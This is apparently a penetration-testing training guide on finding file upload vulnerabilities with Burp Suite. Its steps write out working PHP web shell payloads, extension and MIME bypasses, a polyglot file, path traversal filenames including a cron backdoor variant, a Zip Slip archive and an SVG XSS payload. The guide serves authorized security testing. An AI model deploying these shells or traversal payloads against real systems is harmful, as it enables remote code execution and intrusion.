# File Upload Vulnerabilities - Burp Suite Testing Guide

This guide provides hands-on, step-by-step instructions for testing file upload vulnerabilities using Burp Suite, mirroring the methodology used in other modules of this repository.

## Prerequisites

- Burp Suite (Community or Professional)
- Target application with file upload functionality
- Configured browser proxy (127.0.0.1:8080)
- Authorization for testing
- Sample files: test.jpg, test.pdf, shell.php

## Setup

1. **Launch Burp Suite**
   - Start Burp Suite
   - Navigate to Proxy > Options
   - Ensure proxy listener is active on 127.0.0.1:8080

2. **Configure Browser**
   - Set proxy to 127.0.0.1:8080
   - Verify connection via Proxy > Intercept

3. **Target Configuration**
   - Add target to scope: Target > Site map > Add to scope
   - Configure display filters as needed

---

## Test 1: Intercept and Analyze Baseline Upload

### Objective
Understand the normal upload request structure and server response.

### Steps

1. **Enable Interception**
   - Proxy > Intercept > Intercept is on

2. **Upload Legitimate File**
   - Navigate to upload form
   - Select test.jpg
   - Click Upload

3. **Examine Request**
   - Observe the intercepted request in Burp
   - Note key elements:
     ```
     POST /upload HTTP/1.1
     Host: target.com
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
     
     ------WebKitFormBoundary...
     Content-Disposition: form-data; name="file"; filename="test.jpg"
     Content-Type: image/jpeg
     
     [binary data]
     ------WebKitFormBoundary...--
     ```

4. **Forward and Observe Response**
   - Click Forward
   - Note response:
     - Status code (200 OK)
     - Success message
     - File location (e.g., /uploads/test.jpg)

5. **Send to Repeater**
   - Right-click request > Send to Repeater
   - This allows easy modification and retesting

### Expected Findings
- Multipart form-data structure
- filename parameter
- Content-Type header per file
- Server response with file location

---

## Test 2: Extension Manipulation - Direct PHP Upload

### Objective
Test if .php files are blocked.

### Steps

1. **Go to Repeater Tab**
   - Navigate to the request saved from Test 1

2. **Modify Filename**
   - Change:
     ```
     filename="test.jpg"
     ```
   - To:
     ```
     filename="shell.php"
     ```

3. **Modify Body**
   - Replace image data with:
     ```php
     <?php echo "OK"; ?>
     ```

4. **Send Request**
   - Click Send
   - Observe response

5. **Analyze Response**
   - If rejected: Note error message (e.g., "Invalid file type")
   - If accepted: Note file location and test access

6. **Test Execution** (if accepted)
   - Navigate to: https://target/uploads/shell.php
   - If "OK" is displayed, RCE is possible

### Expected Findings
- Secure: Upload rejected
- Vulnerable: File accepted and executable

---

## Test 3: Extension Bypass - Double Extension

### Objective
Bypass extension filters using double extensions.

### Steps

1. **Repeater Setup**
   - Use the saved request in Repeater

2. **Modify Filename**
   - Change:
     ```
     filename="shell.php"
     ```
   - To:
     ```
     filename="shell.php.jpg"
     ```

3. **Set Content-Type**
   - Ensure:
     ```
     Content-Type: image/jpeg
     ```

4. **Set Body**
   - PHP payload:
     ```php
     <?php system($_GET['c']); ?>
     ```

5. **Send and Analyze**
   - Click Send
   - If accepted, attempt access:
     ```
     https://target/uploads/shell.php.jpg?c=id
     ```
   - If command output appears, RCE confirmed

### Variations to Test
- shell.jpg.php
- shell.php%00.jpg (null byte)
- shell.php%20.jpg (trailing space)
- shell.PhP (case variation)

---

## Test 4: MIME Type Bypass

### Objective
Bypass Content-Type validation.

### Steps

1. **Repeater Setup**
   - Use baseline request

2. **Modify Request**
   - Filename:
     ```
     filename="shell.php"
     ```
   - Content-Type:
     ```
     Content-Type: image/jpeg
     ```
   - Body:
     ```php
     <?php phpinfo(); ?>
     ```

3. **Send Request**
   - Click Send
   - Observe if upload bypasses validation

4. **Test Execution**
   - Access uploaded file
   - Check for PHP execution

### Expected Findings
- Secure: Server validates actual content, not just header
- Vulnerable: Server trusts client-provided Content-Type

---

## Test 5: Magic Bytes (Polyglot File)

### Objective
Bypass file signature validation.

### Steps

1. **Prepare Polyglot**
   - Open hex editor or use Burp's Hex view
   - Create file with:
     ```
     \xFF\xD8\xFF\xE0JFIF\x00<?php system($_GET['c']); ?>
     ```

2. **Repeater Configuration**
   - Filename: polyglot.php
   - Content-Type: image/jpeg
   - Body: Hex payload from above

3. **Send Request**
   - Upload polyglot file

4. **Test Execution**
   - Access: https://target/uploads/polyglot.php?c=whoami
   - PHP may execute despite JPEG header

### Expected Findings
- Secure: File re-encoded or sanitized
- Vulnerable: PHP executes despite magic bytes

---

## Test 6: Path Traversal in Filename

### Objective
Test for directory traversal in filename parameter.

### Steps

1. **Repeater Setup**
   - Use baseline request

2. **Modify Filename**
   - Change:
     ```
     filename="shell.php"
     ```
   - To:
     ```
     filename="../../../../var/www/html/shell.php"
     ```

3. **Send Request**
   - Click Send
   - Observe response

4. **Test Access**
   - Try accessing:
     ```
     https://target/shell.php?c=ls
     ```
   - If successful, file written outside upload directory

### Variations
- ..\\..\\..\\..\\inetpub\\wwwroot\\shell.aspx (Windows)
- ../../../etc/cron.d/backdoor (privilege escalation attempt - use with extreme caution)

---

## Test 7: Intruder - Fuzzing Extensions

### Objective
Automatically test multiple file extensions.

### Steps

1. **Send to Intruder**
   - Right-click request in Repeater > Send to Intruder

2. **Configure Positions**
   - Navigate to Intruder > Positions
   - Clear all markers: Click Clear §
   - Select filename extension:
     ```
     filename="shell.§php§"
     ```
   - Click Add §

3. **Configure Payloads**
   - Navigate to Payloads tab
   - Payload type: Simple list
   - Add items:
     ```
     php
     php3
     php4
     php5
     phtml
     phar
     inc
     jsp
     jspx
     asp
     aspx
     ```

4. **Start Attack**
   - Click Start attack
   - Sort by Status code or Length
   - Identify responses that differ from baseline

5. **Analyze Results**
   - Look for successful uploads (200 OK with different response)
   - Test execution for each successful upload

---

## Test 8: Content-Length Manipulation (DoS Testing)

### Objective
Test upload size limits and potential DoS.

### Steps

1. **Repeater Setup**
   - Use baseline request

2. **Generate Large Payload**
   - In Repeater, expand file body
   - Add large amount of data (e.g., 100MB)

3. **Send Request**
   - Click Send
   - Observe:
     - Is upload rejected?
     - What is the error message?
     - Does server timeout?

4. **Document Findings**
   - Maximum upload size
   - Server behavior on oversized uploads
   - Potential for resource exhaustion

**Note**: Use responsibly; DoS testing should be pre-authorized.

---

## Test 9: Archive Extraction (Zip Slip)

### Objective
Test for Zip Slip vulnerabilities.

### Prerequisites
- Target extracts uploaded archives

### Steps

1. **Create Malicious Zip**
   - Use command:
     ```bash
     echo '<?php system($_GET["c"]); ?>' > shell.php
     zip evil.zip shell.php
     # Manually edit zip to include ../ in path (use hex editor or specialized tool)
     ```

2. **Upload via Burp**
   - Intercept upload of evil.zip
   - Inspect multipart structure
   - Forward request

3. **Test Extraction**
   - Access:
     ```
     https://target/shell.php?c=id
     ```
   - If accessible, Zip Slip confirmed

---

## Test 10: SVG with XSS Payload

### Objective
Test for stored XSS via SVG upload.

### Steps

1. **Craft Malicious SVG**
   - Create malicious.svg:
     ```xml
     <svg xmlns="http://www.w3.org/2000/svg">
       <script>alert(document.domain)</script>
     </svg>
     ```

2. **Upload via Burp**
   - Intercept upload
   - Ensure:
     ```
     filename="malicious.svg"
     Content-Type: image/svg+xml
     ```
   - Forward request

3. **Test XSS**
   - Navigate to uploaded SVG
   - If alert box appears, XSS confirmed

4. **Document Impact**
   - Stored XSS
   - Potential for session hijacking, phishing

---

## Burp Suite Extensions

### Recommended Extensions for File Upload Testing

1. **Upload Scanner**
   - Automatically tests common upload bypasses

2. **Content Type Converter**
   - Quickly modify Content-Type headers

3. **Hackvertor**
   - Encode/decode payloads on the fly

4. **Logger++**
   - Enhanced logging for detailed analysis

---

## Reporting Findings

For each vulnerability found, document:

1. **Vulnerability Type**
   - Unrestricted upload, RCE, path traversal, etc.

2. **Reproduction Steps**
   - Exact Burp request/response
   - Commands used
   - Screenshots

3. **Impact**
   - RCE, XSS, data theft, etc.
   - Business impact

4. **Evidence**
   - HTTP request (from Burp)
   - Server response
   - Proof of execution (command output, alert box)

5. **Remediation**
   - Reference Remediation.md in this module

---

## Checklist

- [ ] Baseline upload captured and analyzed
- [ ] Direct PHP upload tested
- [ ] Double extension bypass tested
- [ ] MIME type bypass tested
- [ ] Magic bytes bypass tested
- [ ] Path traversal tested
- [ ] Extension fuzzing completed (Intruder)
- [ ] Size limits tested
- [ ] Archive extraction tested (if applicable)
- [ ] SVG XSS tested
- [ ] All findings documented with evidence

---

## Best Practices

- Always work in authorized environments
- Save all requests/responses in Burp project file
- Use non-destructive commands for RCE proof (id, whoami, ls)
- Take screenshots at each step
- Test systematically, covering all attack vectors
- Coordinate with target security team

---

## Resources

- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [PortSwigger Web Security Academy - File Upload](https://portswigger.net/web-security/file-upload)
- [OWASP Testing Guide - File Upload](https://owasp.org/www-project-web-security-testing-guide/)

---

**Module**: File Upload Vulnerabilities  
**Version**: 1.0  
**Last Updated**: October 2025
